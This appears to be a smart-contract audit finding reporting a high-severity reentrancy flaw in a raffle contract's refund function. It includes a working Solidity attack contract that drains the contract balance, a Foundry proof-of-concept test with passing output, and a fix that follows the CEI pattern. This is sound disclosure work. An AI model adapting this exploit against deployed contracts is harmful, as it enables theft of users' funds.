## [High - Lost of Funds] Reentrancy attack due to Function refund() not following CEI pattern

### Severity

High Risk

### Date Modified

Oct 27th, 2023

### Summary

All functions with calls should follow the CEI (Check-Effect-Interact) pattern, otherwise the contract is susceptible to losing all funds.

In this case, we can see that the actions are Check-Interact-Effect so a malicious user could steal the entire the contract balance.

Other options are to use the OpenZeppelin library or a modifier, but we will explain this later.

### Vulnerability Details (PoC)

Step 1: To prove the vulnerability, we need an attack contract, as it is not possible to do this with an EOA account.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {console} from "forge-std/Test.sol";

interface IPuppyRaffle {
    function enterRaffle(address[] memory newPlayers) external payable;
    function refund(uint256 playerIndex) external;
    function getActivePlayerIndex(address player) external view returns (uint256);
}

contract RefundHack {
    IPuppyRaffle puppyRaffle;

    address owner;
    uint256 indexOfPlayer;
    uint256 entranceFee = 1e18;

    modifier onlyOwner() {
        require(msg.sender == owner, "only Owner");
        _;
    }

    constructor(address _puppyRaffle) {
        owner = msg.sender;
        puppyRaffle = IPuppyRaffle(_puppyRaffle);
    }

    function enterRaffle() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function attack() external onlyOwner {
        indexOfPlayer = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(indexOfPlayer);
    }

    receive() external payable {
        uint256 raffleBalance = (address(puppyRaffle).balance / 1e18);
        if (raffleBalance > 0) {
            puppyRaffle.refund(indexOfPlayer);
        }
        (bool success,) = owner.call{value: msg.value}("");
        require(success);
    }
}

```

Step 2: Using the same test contract that was created by the dev team:

1. Create a new user attacker.
2. Deploy the attack contract.

Step 3: Create and run the test:

```
function test_refundAttack() external playersEntered {
    // 0.- Starting point
    uint256 raffleBalance = (address(puppyRaffle).balance);
    assertEq(address(attacker).balance, entranceFee);
    assertEq(address(puppyRaffle).balance, raffleBalance);

    vm.startPrank(attacker);
    // 1.- Put the attack contract into the Raffle
    refundHack.enterRaffle{value: entranceFee}();

    // 4.- Stole the funds
    refundHack.attack();
    vm.stopPrank();

    // After the attack, attacker has all the contract balance and contract has 0.
    assertEq(address(attacker).balance, raffleBalance + entranceFee);
    assertEq(address(puppyRaffle).balance, 0);
    }

```

```
  2023-10-Puppy-Raffle git:(main) ✗ forge test --mt test_refundAttack
[⠔] Compiling...
[⠊] Compiling 2 files with 0.7.6
[⠒] Solc 0.7.6 finished in 1.42s

Running 1 test for test/PRTEst.t.sol:PuppyRaffleTest
[PASS] test_refundAttack() (gas: 305684)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.39ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

### Impact

The application will lose any funds it had at the time and will remain vulnerable for future raffles.

### Tools Used

Foundry, terminal.

### Recommendations

The only way to guarantee 100% avoidance of reentrancy attacks is to follow the CEI pattern. So the function has to be rewritten:

```
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}
```

Now, the same test fail:

```
➜  2023-10-Puppy-Raffle git:(main) ✗ forge test --mt test_refundAttack
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/PRTEst.t.sol:PRTEst
[FAIL. Reason: Address: unable to send value, recipient may have reverted] test_refundAttack() (gas: 249565)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.05ms

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/PRTEst.t.sol:PRTEst
[FAIL. Reason: Address: unable to send value, recipient may have reverted] test_refundAttack() (gas: 249565)

Encountered a total of 1 failing tests, 0 tests succeeded
➜  2023-10-Puppy-Raffle git:(main) ✗
```

In addition, it is also recommended that you add a custom reentrancy modifier or use the Open Zeppelin library directly:

https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard
